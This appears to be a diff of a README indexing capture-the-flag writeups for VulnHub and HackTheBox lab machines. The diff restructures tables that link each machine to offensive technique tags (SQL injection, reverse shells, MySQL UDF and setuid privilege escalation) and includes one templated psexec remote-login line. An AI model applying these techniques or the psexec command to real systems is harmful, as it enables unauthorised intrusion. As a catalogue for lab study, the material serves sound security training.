-| 1. | 10/Oct/2019 | [Lord Of The Root: 1.0.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_kernel_overlayfs`](https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/killchain.png" width="100" height="100" /> |
-| 2. | 08/Oct/2019 | [Kioptrix: Level 1.3 (#4)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Lord Of The Root: 1.0.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf) | [vulnhub#129](https://www.vulnhub.com/entry/lord-of-the-root-101,129/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_kernel_overlayfs`](https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) |
+| 2. | [Kioptrix: Level 1.3 (#4)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf) | [vulnhub#25](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) |
   
   
 ---
 <a name="privesc_mysql_udf"></a>
 #### privesc_mysql_udf [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 10/Oct/2019 | [Lord Of The Root: 1.0.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_kernel_overlayfs`](https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/killchain.png" width="100" height="100" /> |
-| 2. | 08/Oct/2019 | [Kioptrix: Level 1.3 (#4)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Lord Of The Root: 1.0.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf) | [vulnhub#129](https://www.vulnhub.com/entry/lord-of-the-root-101,129/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_kernel_overlayfs`](https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) |
+| 2. | [Kioptrix: Level 1.3 (#4)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf) | [vulnhub#25](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) |
   
   
 ---
 <a name="privesc_nfs_norootsquash"></a>
 #### privesc_nfs_norootsquash [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 20/Sep/2019 | [HackLAB: Vulnix](https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/writeup.pdf) |  | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_nfs_norootsquash`](https://github.com/7h3rAm/writeups#privesc_nfs_norootsquash), [`privesc_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#privesc_ssh_authorizedkeys) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [HackLAB: Vulnix](https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/writeup.pdf) | [vulnhub#48](https://www.vulnhub.com/entry/hacklab-vulnix,48/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/killchain.png" width="100" height="100" /> | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_nfs_norootsquash`](https://github.com/7h3rAm/writeups#privesc_nfs_norootsquash), [`privesc_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#privesc_ssh_authorizedkeys) |
   
   
 ---
 <a name="privesc_nmap"></a>
 #### privesc_nmap [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 21/Oct/2019 | [Mr-Robot: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/writeup.pdf) |  | [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/killchain.png" width="100" height="100" /> |
-| 2. | 10/Sep/2019 | [DC: 6](https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_activitymonitor`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_activitymonitor), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Mr-Robot: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/writeup.pdf) | [vulnhub#151](https://www.vulnhub.com/entry/mr-robot-1,151/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/killchain.png" width="100" height="100" /> | [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) |
+| 2. | [DC: 6](https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf) | [vulnhub#315](https://www.vulnhub.com/entry/dc-6,315/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_activitymonitor`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_activitymonitor), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) |
   
   
 ---
 <a name="privesc_passwd_writable"></a>
 #### privesc_passwd_writable [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 11/Oct/2019 | [Misdirection: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf) |  | [`exploit_php_webshell`](https://github.com/7h3rAm/writeups#exploit_php_webshell), [`exploit_bash_reverseshell`](https://github.com/7h3rAm/writeups#exploit_bash_reverseshell), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_passwd_writable`](https://github.com/7h3rAm/writeups#privesc_passwd_writable) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Misdirection: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf) | [vulnhub#371](https://www.vulnhub.com/entry/misdirection-1,371/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/killchain.png" width="100" height="100" /> | [`exploit_php_webshell`](https://github.com/7h3rAm/writeups#exploit_php_webshell), [`exploit_bash_reverseshell`](https://github.com/7h3rAm/writeups#exploit_bash_reverseshell), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_passwd_writable`](https://github.com/7h3rAm/writeups#privesc_passwd_writable) |
   
   
 ---
@@ -2038,59 +2038,59 @@ psexec <username>@<targetip>
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 28/Apr/2020 | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) |  | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) | [hackthebox#archetype](https://www.hackthebox.eu/home/start) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) |
   
   
 ---
 <a name="privesc_setuid"></a>
 #### privesc_setuid [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 28/Oct/2019 | [Node: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf) |  | [`exploit_nodejs`](https://github.com/7h3rAm/writeups#exploit_nodejs), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_mongodb`](https://github.com/7h3rAm/writeups#exploit_mongodb), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/killchain.png" width="100" height="100" /> |
-| 2. | 21/Oct/2019 | [Mr-Robot: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/writeup.pdf) |  | [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/killchain.png" width="100" height="100" /> |
-| 3. | 27/Sep/2019 | [hackme: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/writeup.pdf) |  | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/killchain.png" width="100" height="100" /> |
-| 4. | 17/Sep/2019 | [Escalate_Linux: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/writeup.pdf) |  | [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/killchain.png" width="100" height="100" /> |
-| 5. | 11/Sep/2019 | [FristiLeaks: 1.3](https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/writeup.pdf) |  | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/killchain.png" width="100" height="100" /> |
-| 6. | 05/Sep/2019 | [Billy Madison: 1.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/writeup.pdf) |  | [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Node: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf) | [vulnhub#252](https://www.vulnhub.com/entry/node-1,252/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/killchain.png" width="100" height="100" /> | [`exploit_nodejs`](https://github.com/7h3rAm/writeups#exploit_nodejs), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_mongodb`](https://github.com/7h3rAm/writeups#exploit_mongodb), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
+| 2. | [Mr-Robot: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/writeup.pdf) | [vulnhub#151](https://www.vulnhub.com/entry/mr-robot-1,151/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/killchain.png" width="100" height="100" /> | [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) |
+| 3. | [hackme: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/writeup.pdf) | [vulnhub#330](https://www.vulnhub.com/entry/hackme-1,330/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/killchain.png" width="100" height="100" /> | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
+| 4. | [Escalate_Linux: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/writeup.pdf) | [vulnhub#323](https://www.vulnhub.com/entry/escalate_linux-1,323/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/killchain.png" width="100" height="100" /> | [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
+| 5. | [FristiLeaks: 1.3](https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/writeup.pdf) | [vulnhub#133](https://www.vulnhub.com/entry/fristileaks-13,133/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/killchain.png" width="100" height="100" /> | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
+| 6. | [Billy Madison: 1.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/writeup.pdf) | [vulnhub#161](https://www.vulnhub.com/entry/billy-madison-11,161/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.billymadison1dot1/killchain.png" width="100" height="100" /> | [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
   
   
 ---
 <a name="privesc_shell_escape"></a>
 #### privesc_shell_escape [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 08/Oct/2019 | [Kioptrix: Level 1.3 (#4)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf) |  | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Kioptrix: Level 1.3 (#4)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf) | [vulnhub#25](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/killchain.png" width="100" height="100" /> | [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) |
   
   
 ---
 <a name="privesc_ssh_authorizedkeys"></a>
 #### privesc_ssh_authorizedkeys [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 20/Sep/2019 | [HackLAB: Vulnix](https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/writeup.pdf) |  | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_nfs_norootsquash`](https://github.com/7h3rAm/writeups#privesc_nfs_norootsquash), [`privesc_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#privesc_ssh_authorizedkeys) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [HackLAB: Vulnix](https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/writeup.pdf) | [vulnhub#48](https://www.vulnhub.com/entry/hacklab-vulnix,48/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/killchain.png" width="100" height="100" /> | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_nfs_norootsquash`](https://github.com/7h3rAm/writeups#privesc_nfs_norootsquash), [`privesc_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#privesc_ssh_authorizedkeys) |
   
   
 ---
 <a name="privesc_ssh_knownhosts"></a>
 #### privesc_ssh_knownhosts [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 17/Oct/2019 | [Moria: 1.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.moria11/writeup.pdf) |  | [`privesc_ssh_knownhosts`](https://github.com/7h3rAm/writeups#privesc_ssh_knownhosts) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.moria11/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Moria: 1.1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.moria11/writeup.pdf) | [vulnhub#187](https://www.vulnhub.com/entry/moria-11,187/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.moria11/killchain.png" width="100" height="100" /> | [`privesc_ssh_knownhosts`](https://github.com/7h3rAm/writeups#privesc_ssh_knownhosts) |
   
   
 ---
 <a name="privesc_strace_setuid"></a>
 #### privesc_strace_setuid [⇡](#privesc)  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 10/Oct/2019 | [Lin.Security: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf) |  | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_strace_setuid`](https://github.com/7h3rAm/writeups#privesc_strace_setuid), [`privesc_docker_group`](https://github.com/7h3rAm/writeups#privesc_docker_group) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Lin.Security: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf) | [vulnhub#244](https://www.vulnhub.com/entry/linsecurity-1,244/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/killchain.png" width="100" height="100" /> | [`exploit_nfs_rw`](https://github.com/7h3rAm/writeups#exploit_nfs_rw), [`exploit_ssh_authorizedkeys`](https://github.com/7h3rAm/writeups#exploit_ssh_authorizedkeys), [`privesc_strace_setuid`](https://github.com/7h3rAm/writeups#privesc_strace_setuid), [`privesc_docker_group`](https://github.com/7h3rAm/writeups#privesc_docker_group) |
   
   
 ---
@@ -2098,14 +2098,14 @@ psexec <username>@<targetip>
 #### privesc_sudo [⇡](#privesc)  
 using `sudo` to execute programs that run with elevated privileges  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 25/Jun/2020 | [Bashed](https://github.com/7h3rAm/writeups/blob/master/htb.bashed/writeup.pdf) |  | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_cron_rootjobs`](https://github.com/7h3rAm/writeups#privesc_cron_rootjobs) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.bashed/killchain.png" width="100" height="100" /> |
-| 2. | 29/Oct/2019 | [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100" /> |
-| 3. | 29/Sep/2019 | [Kioptrix: Level 1.2 (#3)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/writeup.pdf) |  | [`exploit_lotuscms`](https://github.com/7h3rAm/writeups#exploit_lotuscms), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/killchain.png" width="100" height="100" /> |
-| 4. | 11/Sep/2019 | [FristiLeaks: 1.3](https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/writeup.pdf) |  | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/killchain.png" width="100" height="100" /> |
